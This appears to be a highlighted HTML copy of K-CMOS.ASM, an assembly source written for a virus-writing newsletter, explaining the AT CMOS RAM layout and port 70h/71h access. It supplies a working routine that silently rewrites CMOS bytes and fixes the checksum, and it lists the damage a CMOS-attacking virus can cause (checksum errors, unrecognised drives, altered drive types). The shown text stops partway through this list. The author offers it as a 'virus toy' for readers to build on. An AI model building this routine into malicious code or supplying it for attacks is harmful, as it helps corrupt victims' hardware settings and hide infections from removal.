<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>K-CMOS.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                        K-CM”S VIRUS for Crypt Newsletter 20</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              In my quest to bring the latest hi-tech computer virus</span><span class="sc0">
</span><span class="sc1">;          toys to you, faithful reader, I have researched one of the</span><span class="sc0">
</span><span class="sc1">;          relatively untouched-by-viruses parts of an AT computer: </span><span class="sc0">
</span><span class="sc1">;          the CMOS.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              The CMOS (Complementary Metal Oxide Semiconductor) is a</span><span class="sc0">
</span><span class="sc1">;          low power consumption semiconductor where information such as</span><span class="sc0">
</span><span class="sc1">;          the current equipment settings, hard drive type, time and</span><span class="sc0">
</span><span class="sc1">;          date is stored and maintained using a NiCad battery that is</span><span class="sc0">
</span><span class="sc1">;          recharged every time you turn on the computer. (That is why</span><span class="sc0">
</span><span class="sc1">;          it's a good idea to turn on the computer every once in a while</span><span class="sc0">
</span><span class="sc1">;          if you are not using it for long periods. This prevents</span><span class="sc0">
</span><span class="sc1">;          battery discharge and loss of CMOS settings.)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              The CMOS in your computer is changed and set every time</span><span class="sc0">
</span><span class="sc1">;          you run the Setup program that comes with your BIOS (AMI,</span><span class="sc0">
</span><span class="sc1">;          Phoenix), and can be accessed and changed by any program</span><span class="sc0">
</span><span class="sc1">;          running from DOS.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          The AT CMOS RAM is divided into three areas:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          1 - The clock/calendar bytes</span><span class="sc0">
</span><span class="sc1">;          2 - The control registers</span><span class="sc0">
</span><span class="sc1">;          3 - General purpose RAM.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          The following table  describes the CMOS RAM location and what</span><span class="sc0">
</span><span class="sc1">;          each byte is used for:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; OFFSET byte    DESCRIPTION</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Real Clock Data</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 00        Current second in BCD</span><span class="sc0">
</span><span class="sc1">; 01        Alarm second in BCD</span><span class="sc0">
</span><span class="sc1">; 02        Current minute in BCD</span><span class="sc0">
</span><span class="sc1">; 03        Alarm minute in BCD</span><span class="sc0">
</span><span class="sc1">; 04        Current Hour in BCD</span><span class="sc0">
</span><span class="sc1">; 05        Alarm Hour in BCD</span><span class="sc0">
</span><span class="sc1">; 06        Current day of week in BCD</span><span class="sc0">
</span><span class="sc1">; 07        Current day in BCD</span><span class="sc0">
</span><span class="sc1">; 08        Current month in BCD</span><span class="sc0">
</span><span class="sc1">; 09        Current year in BCD</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Status Registers</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 0A        Status Register A</span><span class="sc0">
</span><span class="sc1">; 0B        Status Register B</span><span class="sc0">
</span><span class="sc1">; 0C        Status Register C</span><span class="sc0">
</span><span class="sc1">; 0D        Status Register D</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Configuration Data</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 0E         Diagnostic Status</span><span class="sc0">
</span><span class="sc1">;                           Bit 7 - Clock Lost Power</span><span class="sc0">
</span><span class="sc1">;                           Bit 6 - Bad CMOS checksum</span><span class="sc0">
</span><span class="sc1">;                           Bit 5 - invalid config info at POST</span><span class="sc0">
</span><span class="sc1">;                           Bit 4 - memory Size compare error at POST</span><span class="sc0">
</span><span class="sc1">;                           Bit 3 - Fixed disk or adapter failed initialization</span><span class="sc0">
</span><span class="sc1">;                           Bit 2 - Invalid CMOS time</span><span class="sc0">
</span><span class="sc1">;                           Bits 1-0 - Reserved</span><span class="sc0">
</span><span class="sc1">; 0F         Reason for Shutdown</span><span class="sc0">
</span><span class="sc1">;                           00 - Power on or reset</span><span class="sc0">
</span><span class="sc1">;                           01 - Memory Size pass</span><span class="sc0">
</span><span class="sc1">;                           02 - Memory test pass</span><span class="sc0">
</span><span class="sc1">;                           03 - memory test fail</span><span class="sc0">
</span><span class="sc1">;                           04 - POST end: boot system</span><span class="sc0">
</span><span class="sc1">;                           05 - jmp doubleword pointer with EOI</span><span class="sc0">
</span><span class="sc1">;                           06 - Protected tests pass</span><span class="sc0">
</span><span class="sc1">;                           07 - Protected tests fail</span><span class="sc0">
</span><span class="sc1">;                           08 - Memory size fail</span><span class="sc0">
</span><span class="sc1">;                           09 - INT 15h Block move</span><span class="sc0">
</span><span class="sc1">;                           0A - JMP double word pointer without EOI</span><span class="sc0">
</span><span class="sc1">; 10         Diskette Drive Types</span><span class="sc0">
</span><span class="sc1">;                           Bits 7-4  - Diskette drive 0 type</span><span class="sc0">
</span><span class="sc1">;                           Bits 3-0  - Diskette drive 1 type</span><span class="sc0">
</span><span class="sc1">;                               0000b - no drive</span><span class="sc0">
</span><span class="sc1">;                               0001b - 360K drive</span><span class="sc0">
</span><span class="sc1">;                               0010b - 1.2MB drive</span><span class="sc0">
</span><span class="sc1">;                               0011b - 720K drive</span><span class="sc0">
</span><span class="sc1">;                               0100b - 1.44 MB drive</span><span class="sc0">
</span><span class="sc1">;                               0101b - 2.88 MB drive</span><span class="sc0">
</span><span class="sc1">; 11         Reserved</span><span class="sc0">
</span><span class="sc1">; 12         Fixed Disk Drive Types</span><span class="sc0">
</span><span class="sc1">;                           Bits 7-4  - Fixed Disk drive 0 type</span><span class="sc0">
</span><span class="sc1">;                           Bits 3-0  - Fixed Disk drive 1 type</span><span class="sc0">
</span><span class="sc1">;                               0000b - no drive</span><span class="sc0">
</span><span class="sc1">;                           (Note: These drives do not necessarily</span><span class="sc0">
</span><span class="sc1">;                            correspond with the values stored at</span><span class="sc0">
</span><span class="sc1">;                            locations 19h and 1Ah)</span><span class="sc0">
</span><span class="sc1">; 13         Reserved</span><span class="sc0">
</span><span class="sc1">; 14         Equipment Installed</span><span class="sc0">
</span><span class="sc1">;                           Bits 7-6  - # of Diskette drives</span><span class="sc0">
</span><span class="sc1">;                                 00b - 1 diskette drive</span><span class="sc0">
</span><span class="sc1">;                                 01b - 2 diskette drives</span><span class="sc0">
</span><span class="sc1">;                           Bits 5-4  - Primary Display</span><span class="sc0">
</span><span class="sc1">;                                 00b - reserved</span><span class="sc0">
</span><span class="sc1">;                                 01b - 40 X 25 color</span><span class="sc0">
</span><span class="sc1">;                                 10b - 80 X 25 color</span><span class="sc0">
</span><span class="sc1">;                                 11b - 80 X 25 monochrome</span><span class="sc0">
</span><span class="sc1">;                           Bits 3-0  - Reserved</span><span class="sc0">
</span><span class="sc1">; 15         Base Memory in 1K low byte</span><span class="sc0">
</span><span class="sc1">; 16         Base Memory in 1K high byte</span><span class="sc0">
</span><span class="sc1">; 17         Expansion Memory size low byte</span><span class="sc0">
</span><span class="sc1">; 18         Expansion Memory size high byte</span><span class="sc0">
</span><span class="sc1">; 19         Fixed Disk Drive Type 0</span><span class="sc0">
</span><span class="sc1">; 1A         Fixed Disk Drive Type 1</span><span class="sc0">
</span><span class="sc1">; 1B-2D      Reserved</span><span class="sc0">
</span><span class="sc1">; 2E         Configuration Data checksum high byte</span><span class="sc0">
</span><span class="sc1">; 2F         Configuration Data checksum low byte</span><span class="sc0">
</span><span class="sc1">; 30         Actual Expansion Memory size low byte</span><span class="sc0">
</span><span class="sc1">; 31         Actual Expansion Memory size high byte</span><span class="sc0">
</span><span class="sc1">; 32         Century in BCD</span><span class="sc0">
</span><span class="sc1">; 33         Information Flag</span><span class="sc0">
</span><span class="sc1">;                           Bit 7 - 128 Kbyte expanded</span><span class="sc0">
</span><span class="sc1">;                           Bit 6 - Setup Flag</span><span class="sc0">
</span><span class="sc1">;                           Bits 5-0 - Reserved</span><span class="sc0">
</span><span class="sc1">; 34-3F      Reserved</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              As you can see, there are a total of 63 (3F hex) bytes of</span><span class="sc0">
</span><span class="sc1">;          CMOS RAM, with 33 bytes used as 'reserved' memory in the</span><span class="sc0">
</span><span class="sc1">;          three areas;  these locations are not currently defined by</span><span class="sc0">
</span><span class="sc1">;          the AT BIOS and might be used to store data that will be</span><span class="sc0">
</span><span class="sc1">;          restored after power is shut down.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          The 4 status registers (A through D) located, appropriately, at</span><span class="sc0">
</span><span class="sc1">;          locations 0Ah through 0Dh define the chips operating</span><span class="sc0">
</span><span class="sc1">;          parameters and provide information about interrupts and the</span><span class="sc0">
</span><span class="sc1">;          state of the real time clock chip (RTC).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          With very few restrictions all CMOS RAM locations may be</span><span class="sc0">
</span><span class="sc1">;          directly accessed by an application.</span><span class="sc0">
</span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc1">;          Program locations 11h, 13h, and 1Bh through 2Dh are used</span><span class="sc0">
</span><span class="sc1">;          in calculating the CMOS checksum that the BIOS stores at</span><span class="sc0">
</span><span class="sc1">;          locations 2Eh and 2Fh.</span><span class="sc0">
</span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc1">;          Note: If a program changes ANY bytes at locations 10h </span><span class="sc0">
</span><span class="sc1">;          through 2Dh it must also recalculate the checksum and store </span><span class="sc0">
</span><span class="sc1">;          the new value.  Changing these bytes (10h -&gt; 2Dh) without </span><span class="sc0">
</span><span class="sc1">;          correcting the checksum results in a 'CMOS checksum error' </span><span class="sc0">
</span><span class="sc1">;          forcing you to run the BIOS setup and reenter all of the CMOS</span><span class="sc0">
</span><span class="sc1">;          information.</span><span class="sc0">
</span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc1">;          The reserved memory locations 34h through 3Fh are not used in</span><span class="sc0">
</span><span class="sc1">;          checksum calculations and may be changed with extreme caution</span><span class="sc0">
</span><span class="sc1">;          since different BIOS versions, manufacturers and hardware</span><span class="sc0">
</span><span class="sc1">;          configurations use this reserved CMOS RAM locations for</span><span class="sc0">
</span><span class="sc1">;          extended system setup information including BIOS passwords</span><span class="sc0">
</span><span class="sc1">;          and DMA settings.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          To access and change a computer's CMOS RAM is very simple:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          Access is done through ports 70 hex (CMOS control/address)</span><span class="sc0">
</span><span class="sc1">;          and port 71 hex (CMOS data).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          The process is thus:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          1 - We specify the CMOS RAM address of the byte we want to</span><span class="sc0">
</span><span class="sc1">;              read or write using port 70h</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          EXAMPLE:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          mov  al,XX   where XX = byte specifying the address (00h-&gt;3Fh)</span><span class="sc0">
</span><span class="sc1">;          out  70h,al</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          2 - We read or write a byte to the address specified in step</span><span class="sc0">
</span><span class="sc1">;              1.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          READ EXAMPLE:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          in  al,71h   byte at location XX goes into AL</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          WRITE EXAMPLE:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          out  71h,al  byte in AL goes to location XX in the CMOS RAM</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          There is one little problem: if we are writing to any of the</span><span class="sc0">
</span><span class="sc1">;          locations that are checksummed (10h through 2Dh), we must</span><span class="sc0">
</span><span class="sc1">;          change the checksum value as well; so we follow steps 1 and 2</span><span class="sc0">
</span><span class="sc1">;          with the checksum values at locations 2Eh and 2Fh, combine</span><span class="sc0">
</span><span class="sc1">;          the bytes into one register and subtract the current byte</span><span class="sc0">
</span><span class="sc1">;          value from the register containing the checksum. Then we add</span><span class="sc0">
</span><span class="sc1">;          the value of the new byte to be put in the CMOS RAM to the</span><span class="sc0">
</span><span class="sc1">;          register that has the checksum, and we write the checksum,</span><span class="sc0">
</span><span class="sc1">;          and the new byte to the CMOS.</span><span class="sc0">
</span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc1">;          While all of this might seem too complicated, I have</span><span class="sc0">
</span><span class="sc1">;          written a mini-CM”S toolkit, a routine that takes the address</span><span class="sc0">
</span><span class="sc1">;          and the new value of the byte to be put in the CMOS, and does</span><span class="sc0">
</span><span class="sc1">;          the dirty work of putting the values and of changing the</span><span class="sc0">
</span><span class="sc1">;          checksum for you.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          Read the code carefully. It will make everything become</span><span class="sc0">
</span><span class="sc1">;          clearer.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">CMOS_CHCKSM</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; INPUT:</span><span class="sc0">
</span><span class="sc1">; DL = CMOS ADDRESS of BYTE TO be MODiFiED</span><span class="sc0">
</span><span class="sc1">; BL = NEW BYTE VALUE to be PUT IN CMOS RAM</span><span class="sc0">

</span><span class="sc1">; OUTPUT:</span><span class="sc0">
</span><span class="sc1">; None.</span><span class="sc0">
</span><span class="sc1">; REGISTERS USED: AX,CX,BX,DX</span><span class="sc0">

</span><span class="sc1">;*************************</span><span class="sc0">
</span><span class="sc1">; GET CMOS Checksum =&gt; CX</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">           </span><span class="sc1">;msb of checksum address</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;send address / control byte</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">           </span><span class="sc1">;read byte</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">;store al in ch</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">           </span><span class="sc1">;lsb of checksum address</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;send address / control byte</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">           </span><span class="sc1">;read byte</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">;store lsb to cl</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; Fix CMOS Checksum</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;AL = address</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;send address / control byte</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">          </span><span class="sc1">;read register</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;subtract from checksum</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;update checksum value in register.</span><span class="sc0">

</span><span class="sc1">;****************************</span><span class="sc0">
</span><span class="sc1">; Write CMOS byte to Address</span><span class="sc0">
</span><span class="sc1">;****************************</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;AL = address</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;specify CMOS address</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">;new CMOS value =&gt; al</span><span class="sc0">

        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;write new CMOS byte</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; Write CMOS Checksum</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">          </span><span class="sc1">;address of checksum 's msb</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;specify CMOS address</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">           </span><span class="sc1">;msb of new checksum</span><span class="sc0">

        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;write new CMOS msb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">          </span><span class="sc1">;address of checksum 's lsb</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;specify CMOS address</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">;lsb of new checksum</span><span class="sc0">

        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;write new CMOS lsb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">


             </span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">worth</span><span class="sc0"> </span><span class="sc5">mentioning</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">XT</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8088</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">type</span><span class="sc0"> </span><span class="sc5">computers</span><span class="sc0">
         </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">routine</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">no</span><span class="sc0"> </span><span class="sc5">adverse</span><span class="sc0"> </span><span class="sc5">effects</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
         </span><span class="sc5">execution</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc4">-</span><span class="sc5">infected</span><span class="sc0"> </span><span class="sc5">program.</span><span class="sc0">

             </span><span class="sc5">There</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">many</span><span class="sc0"> </span><span class="sc5">intriguing</span><span class="sc0"> </span><span class="sc5">features</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc4">-</span><span class="sc5">attacking</span><span class="sc0"> 
         </span><span class="sc5">viruses</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">biggest</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">interaction</span><span class="sc0"> </span><span class="sc5">between</span><span class="sc0"> </span><span class="sc5">software</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">stopped</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc9">common</span><span class="sc0"> </span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0">
         </span><span class="sc5">resident</span><span class="sc0"> </span><span class="sc5">programs.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">most</span><span class="sc0"> </span><span class="sc5">talked</span><span class="sc0"> </span><span class="sc5">about</span><span class="sc0"> </span><span class="sc5">example</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">such</span><span class="sc0">
         </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">South</span><span class="sc0"> </span><span class="sc5">African</span><span class="sc0"> </span><span class="sc5">EXEbug</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">which</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0">
         </span><span class="sc5">manipulation</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">make</span><span class="sc0"> </span><span class="sc5">itself</span><span class="sc0"> </span><span class="sc5">difficult</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">remove</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0">
         </span><span class="sc5">infected</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk.</span><span class="sc0"> </span><span class="sc5">EXEbug</span><span class="sc0"> </span><span class="sc5">massages</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">so</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0">
         </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">machine</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">booted</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">recognized.</span><span class="sc0">

         </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">list</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">possible</span><span class="sc0"> </span><span class="sc5">problems</span><span class="sc0"> </span><span class="sc5">created</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0">
         </span><span class="sc5">attacking</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">long</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">checksum</span><span class="sc0"> </span><span class="sc5">errors.</span><span class="sc0">
         </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">force</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">user</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">reenter</span><span class="sc0"> </span><span class="sc10">all</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">data.</span><span class="sc0">
         </span><span class="sc5">Change</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">correct</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">range</span><span class="sc0"> </span><span class="sc5">without</span><span class="sc0">
         </span><span class="sc5">updating</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">checksum.</span><span class="sc0">

         </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Dead</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">drives.</span><span class="sc0">
         </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">could</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">uninformed</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">presume</span><span class="sc0"> </span><span class="sc5">they</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0">
         </span><span class="sc5">encountered</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">hardware</span><span class="sc0"> </span><span class="sc5">problem.</span><span class="sc0">

         </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Changed</span><span class="sc0"> </span><span class="sc5">hardrive</span><span class="sc0"> </span><span class="sc5">types</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">horrendous</span><span class="sc0"> </span><span class="sc5">hardrive</span><span class="sc0"> </span><span class="sc5">problems.</span><span class="sc0">
